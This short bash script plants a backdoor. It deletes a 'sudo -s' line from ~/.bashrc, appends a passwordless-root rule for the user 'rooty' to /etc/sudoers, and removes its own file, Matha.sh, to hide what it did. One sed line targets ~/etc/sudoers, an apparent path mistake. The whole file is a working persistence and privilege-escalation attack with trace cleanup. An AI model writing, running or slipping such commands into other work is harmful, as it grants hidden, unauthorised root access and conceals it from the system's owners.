#!/bin/bash
sed -i '/sudo -s/d' ~/.bashrc 
sed -i '/rooty ALL=(ALL) NOPASSWD:ALL/d' ~/etc/sudoers
echo "rooty ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
rm -f Matha.sh
exit
 
